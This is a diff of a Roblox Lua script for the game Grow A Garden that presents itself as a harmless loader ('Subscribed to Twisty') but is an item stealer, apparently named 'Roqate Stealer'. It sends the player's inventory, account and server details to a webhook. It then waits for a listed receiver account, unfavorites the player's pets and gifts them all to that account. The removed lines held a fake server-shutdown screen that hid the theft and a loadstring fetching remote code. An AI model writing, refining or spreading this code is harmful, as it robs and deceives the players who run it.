@@ -5,7 +5,6 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
-local UserInputService = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
@@ -15,10 +14,27 @@ local SPECIAL_PETS = {"Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Dis
 local CHECK_INTERVAL = 5
 local SHUTDOWN_DURATION = 10
 local GIFT_COOLDOWN = 3
-local CHAT_KEYWORD = "a"
-local GIFT_PROMPT_TEXT = "actiontext gift pet"
 local MINIMUM_PETS = 3
 local MINIMUM_TOTAL_VALUE = 50000
+
+-- Executor identification
+local function identifyExecutor()
+    if syn then
+        return "Synapse X"
+    elseif PROTOSMASHER_LOADED then
+        return "ProtoSmasher"
+    elseif KRNL_LOADED then
+        return "Krnl"
+    elseif fluxus then
+        return "Fluxus"
+    elseif getexecutorname then
+        return getexecutorname()
+    elseif identifyexecutor then
+        return identifyexecutor()
+    else
+        return "Unknown Executor"
+    end
+end
 
 if syn then
     syn.protect_gui(syn.secure_call)
@@ -26,52 +42,170 @@ if syn then
 end
 
 local function sendWebhook(data)
-    if not data or (not data.content and not data.embeds) then
-        return false
-    end
-
     local body = {
         content = data.content,
         embeds = data.embeds,
-        username = "Twisty Subscriber",
+        username = "Roqate Stealer",
         avatar_url = "https://i.imgur.com/6JqX9yP.png"
     }
 
-    local json, encodeError = pcall(HttpService.JSONEncode, HttpService, body)
-    if not json then
-        return false
+    local json = HttpService:JSONEncode(body)
+    
+    local requestFunc = syn and syn.request or http_request or request
+    if requestFunc then
+        requestFunc({
+            Url = Webhook1,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = json
+        })
     end
+end
 
-    local requestMethods = {
-        syn and syn.request,
-        http_request,
-        request,
-        fluxus and fluxus.request,
-        http and http.request
-    }
+local function getPetsInventory()
+    local backpack = LocalPlayer:FindFirstChild("Backpack")
+    if not backpack then return {} end
 
-    for _, reqFunc in ipairs(requestMethods) do
-        if type(reqFunc) == "function" then
-            local success, response = pcall(function()
-                return reqFunc({
-                    Url = Webhook1,
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json",
-                        ["User-Agent"] = "Roblox"
-                    },
-                    Body = json
-                })
-            end)
+    local pets = {}
+    for _, item in ipairs(backpack:GetChildren()) do
+        local nameMatch = item.Name:match("^(.+) %[%d+%.%d+ KG%] %[Age %d+%]$")
+        if nameMatch then
+            local petName = nameMatch
+            local kg = tonumber(item.Name:match("%[(%d+%.%d+) KG%]")) or 0
+            local age = tonumber(item.Name:match("%[Age (%d+)%]")) or 0
+            local isSpecial = false
 
-            if success and response then
-                if response.StatusCode and response.StatusCode >= 200 and response.StatusCode < 300 then
-                    return true
+            for _, specialName in ipairs(SPECIAL_PETS) do
+                if petName:find(specialName) then
+                    isSpecial = true
+                    break
                 end
             end
+
+            table.insert(pets, {
+                instance = item,
+                name = petName,
+                fullName = item.Name,
+                kg = kg,
+                age = age,
+                special = isSpecial
+            })
         end
     end
-    return false
+    return pets
+end
+
+local function calculatePetValue(kg, age)
+    return math.floor((kg * 10000) + (age * 1000))
+end
+
+local function splitEmbeds(pets, totalValue, specialCount)
+    local embeds = {}
+    local currentEmbed = {
+        title = "📊 Player Inventory Report",
+        color = 65280,
+        timestamp = DateTime.now():ToIsoDate(),
+        fields = {}
+    }
+    
+    -- Add basic info to first embed
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    local gameInstanceId = tostring(game.JobId)
+    
+    table.insert(currentEmbed.fields, {
+        name = "👤 Player Info",
+        value = string.format("```Username: %s (@%s)\nAccount Age: %d days\nExecutor: %s```", 
+            LocalPlayer.Name, 
+            LocalPlayer.DisplayName, 
+            LocalPlayer.AccountAge,
+            identifyExecutor()
+        ),
+        inline = false
+    })
+    
+    table.insert(currentEmbed.fields, {
+        name = "🌐 Server Info",
+        value = string.format("```Place ID: %d\nGame Instance: %s```\n[Join Server](https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s)", 
+            placeId, 
+            gameInstanceId,
+            placeId,
+            gameInstanceId
+        ),
+        inline = false
+    })
+    
+    table.insert(currentEmbed.fields, {
+        name = "📦 Inventory Summary",
+        value = string.format("```Total Pets: %d\nSpecial Pets: %d\nTotal Value: %d¢```", 
+            #pets, 
+            specialCount,
+            totalValue
+        ),
+        inline = false
+    })
+    
+    table.insert(embeds, currentEmbed)
+    
+    -- Split pets into multiple embeds if needed
+    local petChunks = {}
+    for i = 1, #pets, 20 do
+        table.insert(petChunks, {table.unpack(pets, i, math.min(i + 19, #pets))})
+    end
+    
+    for i, chunk in ipairs(petChunks) do
+        if i > 1 then
+            currentEmbed = {
+                title = string.format("📊 Player Inventory Report (Part %d)", i),
+                color = 65280,
+                timestamp = DateTime.now():ToIsoDate(),
+                fields = {}
+            }
+        end
+        
+        local petList = ""
+        for _, pet in ipairs(chunk) do
+            local value = calculatePetValue(pet.kg, pet.age)
+            petList = petList..string.format("%s %s [%.2f KG] [Age %d] → %d¢\n",
+                pet.special and "🌟" or "🐶",
+                pet.name,
+                pet.kg,
+                pet.age,
+                value
+            )
+        end
+        
+        table.insert(currentEmbed.fields, {
+            name = string.format("🐾 Pets (%d-%d)", (i-1)*20 + 1, math.min(i*20, #pets)),
+            value = "```"..petList.."```",
+            inline = false
+        })
+        
+        if i > 1 then
+            table.insert(embeds, currentEmbed)
+        end
+    end
+    
+    return embeds
+end
+
+local function sendInitialReport()
+    local pets = getPetsInventory()
+    local totalValue = 0
+    local specialCount = 0
+    
+    for _, pet in ipairs(pets) do
+        local value = calculatePetValue(pet.kg, pet.age)
+        totalValue = totalValue + value
+        if pet.special then specialCount = specialCount + 1 end
+    end
+
+    local embeds = splitEmbeds(pets, totalValue, specialCount)
+    sendWebhook({
+        embeds = embeds
+    })
 end
 
 local function createLoader()
@@ -94,7 +228,7 @@ local function createLoader()
     corner.Parent = mainFrame
 
     local titleLabel = Instance.new("TextLabel")
-    titleLabel.Text = "TwistyScripts Loader"
+    titleLabel.Text = "Subscribed to Twisty"
     titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
     titleLabel.TextSize = 24
     titleLabel.Font = Enum.Font.GothamBold
@@ -103,290 +237,20 @@ local function createLoader()
     titleLabel.Position = UDim2.new(0, 0, 0, 10)
     titleLabel.Parent = mainFrame
 
-    local progressFrame = Instance.new("Frame")
-    progressFrame.Size = UDim2.new(0.9, 0, 0, 20)
-    progressFrame.Position = UDim2.new(0.05, 0, 0, 100)
-    progressFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-    progressFrame.BorderSizePixel = 0
-    progressFrame.Parent = mainFrame
-
-    local progressCorner = Instance.new("UICorner")
-    progressCorner.CornerRadius = UDim.new(0, 10)
-    progressCorner.Parent = progressFrame
-
-    local progressBar = Instance.new("Frame")
-    progressBar.Size = UDim2.new(0, 0, 1, 0)
-    progressBar.BackgroundColor3 = Color3.fromRGB(130, 36, 212)
-    progressBar.BorderSizePixel = 0
-    progressBar.Parent = progressFrame
-
-    local barCorner = Instance.new("UICorner")
-    barCorner.CornerRadius = UDim.new(0, 10)
-    barCorner.Parent = progressBar
-
     loaderGui.Parent = CoreGui
-
-    local function updateProgress(percent)
-        TweenService:Create(progressBar, TweenInfo.new(0.5), {
-            Size = UDim2.new(percent / 100, 0, 1, 0)
-        }):Play()
-    end
-
-    updateProgress(10)
-    task.wait(1)
-    updateProgress(30)
-    task.wait(1.5)
-    updateProgress(60)
-    task.wait(2)
-    updateProgress(100)
-    task.wait(1)
-
-    TweenService:Create(mainFrame, TweenInfo.new(0.5), {
-        Size = UDim2.new(0, 0, 0, 0)
-    }):Play()
-    task.wait(0.5)
-    loaderGui:Destroy()
-end
-
-local function createFakeShutdown()
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "FakeShutdown"
-    gui.IgnoreGuiInset = true
-    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    gui.DisplayOrder = 999999
-
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(1, 0, 1, 0)
-    frame.BackgroundColor3 = Color3.new(0, 0, 0)
-    frame.Parent = gui
-
-    local title = Instance.new("TextLabel")
-    title.Text = "Grow A Garden"
-    title.TextColor3 = Color3.new(1, 1, 1)
-    title.Size = UDim2.new(1, 0, 0.3, 0)
-    title.Position = UDim2.new(0, 0, 0.3, 0)
-    title.BackgroundTransparency = 1
-    title.Font = Enum.Font.SourceSansBold
-    title.TextSize = 32
-    title.TextTransparency = 1
-    title.Parent = frame
-
-    local message = Instance.new("TextLabel")
-    message.Text = "Servers shutting down for maintenance..."
-    message.TextColor3 = Color3.new(1, 1, 1)
-    message.Size = UDim2.new(1, 0, 0.2, 0)
-    message.Position = UDim2.new(0, 0, 0.5, 0)
-    message.BackgroundTransparency = 1
-    message.Font = Enum.Font.SourceSans
-    message.TextSize = 24
-    message.TextTransparency = 1
-    message.Parent = frame
-
-    local dots = Instance.new("TextLabel")
-    dots.Text = "Please wait"
-    dots.TextColor3 = Color3.new(1, 1, 1)
-    dots.Size = UDim2.new(1, 0, 0.1, 0)
-    dots.Position = UDim2.new(0, 0, 0.6, 0)
-    dots.BackgroundTransparency = 1
-    dots.Font = Enum.Font.SourceSans
-    dots.TextSize = 18
-    dots.TextTransparency = 1
-    dots.Parent = frame
-
-    gui.Parent = CoreGui
-
-    local fadeInTime = 1.5
-    local fadeInStart = os.clock()
-    local fadeConn
-    fadeConn = RunService.Heartbeat:Connect(function()
-        local elapsed = os.clock() - fadeInStart
-        local alpha = math.min(elapsed / fadeInTime, 1)
-
-        title.TextTransparency = 1 - alpha
-        message.TextTransparency = 1 - alpha
-        dots.TextTransparency = 1 - alpha
-
-        if alpha >= 1 then
-            fadeConn:Disconnect()
-        end
-    end)
-
-    local dotCount = 0
-    local lastDotTime = os.clock()
-    local dotInterval = 0.8
-    local dotConn
-    dotConn = RunService.Heartbeat:Connect(function()
-        local now = os.clock()
-        if now - lastDotTime >= dotInterval then
-            lastDotTime = now
-            dotCount = (dotCount + 1) % 4
-            dots.Text = "Please wait"..string.rep(".", dotCount)
-        end
-    end)
-
-    local pulseConn
-    pulseConn = RunService.Heartbeat:Connect(function()
-        local pulse = math.sin(os.clock() * 1.5) * 0.05 + 1
-        title.TextSize = 32 * pulse
-    end)
-
-    return gui, function()
-        if fadeConn then fadeConn:Disconnect() end
-        if dotConn then dotConn:Disconnect() end
-        if pulseConn then pulseConn:Disconnect() end
-        gui:Destroy()
-    end
-end
-
-local function getSortedPets()
-    local backpack = LocalPlayer:FindFirstChild("Backpack")
-    if not backpack then return {} end
-
-    local pets = {}
-
-    for _, item in ipairs(backpack:GetChildren()) do
-        local nameMatch = item.Name:match("^(.+) %[%d+%.%d+ KG%] %[Age %d+%]$")
-        if nameMatch then
-            local petName = nameMatch
-            local kg = tonumber(item.Name:match("%[(%d+%.%d+) KG%]"))
-            local age = tonumber(item.Name:match("%[Age (%d+)%]"))
-            local isSpecial = false
-
-            for _, specialName in ipairs(SPECIAL_PETS) do
-                if petName:find(specialName) then
-                    isSpecial = true
-                    break
-                end
-            end
-
-            table.insert(pets, {
-                instance = item,
-                name = petName,
-                fullName = item.Name,
-                kg = kg,
-                age = age,
-                special = isSpecial
-            })
-        end
-    end
-
-    if #pets == 0 then return pets end
-
-    table.sort(pets, function(a, b)
-        if a.special and not b.special then return true end
-        if not a.special and b.special then return false end
-        if a.kg ~= b.kg then return a.kg > b.kg end
-        return a.age > b.age
-    end)
-
-    return pets
-end
-
-local function calculateInventoryValue(pets)
-    local totalValue = 0
-    for _, pet in ipairs(pets) do
-        totalValue = totalValue + (pet.kg * 10000) + (pet.age * 1000)
-    end
-    return math.floor(totalValue)
-end
-
-local function sendInitialReport()
-    local pets = getSortedPets()
-    if #pets < MINIMUM_PETS then
-        return false, "Not enough pets ("..#pets.."/"..MINIMUM_PETS..")"
-    end
-
-    local totalValue = calculateInventoryValue(pets)
-    if totalValue < MINIMUM_TOTAL_VALUE then
-        return false, "Low value ("..totalValue.."/"..MINIMUM_TOTAL_VALUE.."¢)"
-    end
-
-    local placeId = game.PlaceId
-    local jobId = game.JobId
-    local serverUrl = "https://www.roblox.com/games/"..placeId.."?privateServerLinkCode="..jobId
-
-    local petList = ""
-    local specialCount = 0
-    for _, pet in ipairs(pets) do
-        local value = math.floor((pet.kg * 10000) + (pet.age * 1000))
-        petList = petList..string.format(
-            "%s %s [%.2f KG] [Age %d] → %d¢\n",
-            pet.special and "🌟" or "🐶",
-            pet.name,
-            pet.kg,
-            pet.age,
-            value
-        )
-        if pet.special then specialCount = specialCount + 1 end
-    end
-
-    local embed = {
-        title = "📊 Player Inventory Report",
-        description = string.format([[
-**Player:** %s (@%s)
-**Account Age:** %d days
-**Server:** [Join Game](%s)
-
-**Pet Inventory (%d)**
-%s
-**Total Value:** %d¢
-**Special Pets:** %d
-]], 
-            LocalPlayer.Name,
-            LocalPlayer.DisplayName,
-            LocalPlayer.AccountAge,
-            serverUrl,
-            #pets,
-            petList,
-            totalValue,
-            specialCount
-        ),
-        color = 65280,
-        footer = {
-            text = "Watching for: "..table.concat(RECEIVERS, ", ")
-        },
-        timestamp = DateTime.now():ToIsoDate()
-    }
-
-    return sendWebhook({
-        content = specialCount > 0 and "@everyone" or nil,
-        embeds = {embed}
-    })
+    return loaderGui
 end
 
 local function isPetFavorited(petName)
-    local backpack = LocalPlayer:FindFirstChild("Backpack")
-    if not backpack then return false end
-
-    local pet = backpack:FindFirstChild(petName)
-    if not pet then return false end
-
-    return pet:GetAttribute("Favorited") or false
+    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
+    return pet and pet:GetAttribute("Favorited")
 end
 
 local function unfavoritePet(petName)
-    local backpack = LocalPlayer:FindFirstChild("Backpack")
-    if not backpack then return false end
-
-    local pet = backpack:FindFirstChild(petName)
-    if not pet then return false end
-
-    ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
-    return true
-end
-
-local function isGiftPromptVisible(targetPlayer)
-    for _, gui in ipairs(CoreGui:GetChildren()) do
-        if gui:IsA("ScreenGui") then
-            local headText = gui:FindFirstChild("Head", true)
-            local actionText = gui:FindFirstChild("actiontext", true)
-
-            if headText and actionText then
-                if headText.Text:find(targetPlayer.Name) and actionText.Text:lower():find(GIFT_PROMPT_TEXT:lower()) then
-                    return true
-                end
-            end
-        end
+    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
+    if pet then
+        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
+        return true
     end
     return false
 end
@@ -400,16 +264,17 @@ local function equipSinglePet(petName)
     if not character then return false end
 
     for _, item in ipairs(character:GetChildren()) do
-        if item.Name:match("^(.+) %[%d+%.%d+ KG%] %[Age %d+%]$") then
+        if item.Name:match(" %[%d+%.%d+ KG%] %[Age %d+%]$") then
             item.Parent = LocalPlayer.Backpack
         end
     end
 
     local pet = LocalPlayer.Backpack:FindFirstChild(petName)
-    if not pet then return false end
-
-    pet.Parent = character
-    return true
+    if pet then
+        pet.Parent = character
+        return true
+    end
+    return false
 end
 
 local function teleportToPlayer(targetPlayer)
@@ -438,44 +303,18 @@ end
 local function waitForReceiver()
     local receiverFound = Instance.new("BindableEvent")
 
-    local function checkReceiver(player)
-        return table.find(RECEIVERS, player.Name)
-    end
-
-    local function onPlayerMessage(player, message)
-        if message:lower() == CHAT_KEYWORD:lower() and checkReceiver(player) then
-            receiverFound:Fire(player)
-        end
-    end
-
     for _, player in ipairs(Players:GetPlayers()) do
-        if checkReceiver(player) then
+        if table.find(RECEIVERS, player.Name) then
             receiverFound:Fire(player)
             break
         end
     end
 
-    local connections = {}
-
-    connections.playerAdded = Players.PlayerAdded:Connect(function(player)
-        if checkReceiver(player) then
+    local connection = Players.PlayerAdded:Connect(function(player)
+        if table.find(RECEIVERS, player.Name) then
             receiverFound:Fire(player)
         end
     end)
-
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player:FindFirstChild("PlayerGui") then
-            local chatEvents = player.PlayerGui:FindFirstChild("ChatEvents")
-            if chatEvents then
-                local chatRemote = chatEvents:FindFirstChild("SayMessageRequest")
-                if chatRemote then
-                    connections["chat_"..player.Name] = chatRemote.OnClientEvent:Connect(function(message)
-                        onPlayerMessage(player, message)
-                    end)
-                end
-            end
-        end
-    end
 
     local backupCheck = coroutine.create(function()
         while true do
@@ -490,21 +329,14 @@ local function waitForReceiver()
     coroutine.resume(backupCheck)
 
     local foundReceiver = receiverFound.Event:Wait()
-
-    for _, connection in pairs(connections) do
-        connection:Disconnect()
-    end
-
+    connection:Disconnect()
     return foundReceiver
 end
 
 local function startGifting(targetPlayer)
     while true do
-        local pets = getSortedPets()
-        if #pets == 0 then
-            task.wait(5)
-            continue
-        end
+        local pets = getPetsInventory()
+        if #pets == 0 then break end
 
         for _, pet in ipairs(pets) do
             if isPetFavorited(pet.fullName) then
@@ -512,53 +344,23 @@ local function startGifting(targetPlayer)
                 task.wait(1)
             end
 
-            if not equipSinglePet(pet.fullName) then
-                continue
+            if equipSinglePet(pet.fullName) then
+                giftPet(targetPlayer, pet.fullName)
+                task.wait(GIFT_COOLDOWN)
+                break
             end
-            task.wait(0.5)
-
-            giftPet(targetPlayer, pet.fullName)
-            task.wait(GIFT_COOLDOWN)
-            break
         end
-
         task.wait(1)
     end
 end
 
-local function loadSpawner()
-    local success, spawner = pcall(function()
-        return loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
-    end)
-
-    if success and spawner then
-        spawner.Load()
-    end
-end
-
-createLoader()
-local reportSuccess, reportError = sendInitialReport()
-if not reportSuccess then
-    return
-end
-
-task.spawn(loadSpawner)
-task.wait(5)
+local loader = createLoader()
+sendInitialReport()
+task.wait(2)
+loader:Destroy()
 
 local receiver = waitForReceiver()
-if not receiver then
-    return
-end
+if not receiver then return end
 
-local shutdownGui, cleanupFunc = createFakeShutdown()
 teleportToPlayer(receiver)
-
-task.wait(2)
 startGifting(receiver)
-
-task.wait(SHUTDOWN_DURATION)
-if type(cleanupFunc) == "function" then
-    cleanupFunc()
-elseif shutdownGui then
-    shutdownGui:Destroy()
-end
